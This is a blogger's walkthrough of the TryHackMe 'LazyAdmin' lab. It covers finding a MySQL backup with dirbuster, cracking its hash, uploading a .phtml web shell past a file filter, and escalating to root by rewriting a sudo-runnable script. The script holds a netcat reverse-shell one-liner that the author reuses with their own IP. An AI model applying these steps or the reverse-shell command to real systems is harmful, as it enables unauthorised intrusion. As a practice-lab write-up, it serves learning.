### THM LazyAdmin

Back for another.  We're gonna push through these though cause test time is coming up.

So quickly we have http and ssh open on this device, (port 80 and 22).  Go to the website and it's a base Apache page.  We've seen this before.  Try a couple quick things but don't find anything.  So break out dirbuster.

Run dirbuster and after some time we get a path to `Dir found: /content/inc/mysql_backup/ - 200`.  Go there and there's a backfile file.  So go in and download that cat it out and we find a password hash.

Go back to my main device with the GPU and run hashcat on the hash we found.  Now we have a password and a username.

Keep looking through the dirbuster output and trying things and we find the following gives us a login page.

```
Dir found: /content/as/ - 200
File found: /content/as/index.php - 200
```

Go to that page and we have a login page.  Use the creds we found in the mysql backup file and we get logged in.

Looks like we're looking at a web interface.  Some digging through that and we find a file upload type thing.  Try a .php file, that didn't work.  Change that same file to a .phtml file and that one uploaded.  Open that page after getting our listener going and we have a foothold!!

Now to go hunting.  I did a lot of hunting and found out I was looking at the answer and didn't see it.  Here's how the rest goes.

```
www-data@THM-Chal:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

So we got perl and a perl script.  So what does that backup.pl file do?

```
www-data@THM-Chal:/home/itguy$ cat backup.pl
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

It runs a script called `copy.sh`.  What's that do?

```
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

So that actually runs a reverse shell.  We're gonna take that for ourselves.

Change out the IP in the script and put our own ip in.  And then echo that out into the command and have it overwrite the original command and then run it as sudo, since we can do that.

![script change](/Images/THM6LazyAdmin/pic1.png)

And our listener...

![root!](/Images/THM6LazyAdmin/pic2.png)

And that's that.  Gotta remember to try and cat out everything.  I didn't do the perl file cause I wasn't aware that it was a perl file.  Thanks for coming along.  On to the next.

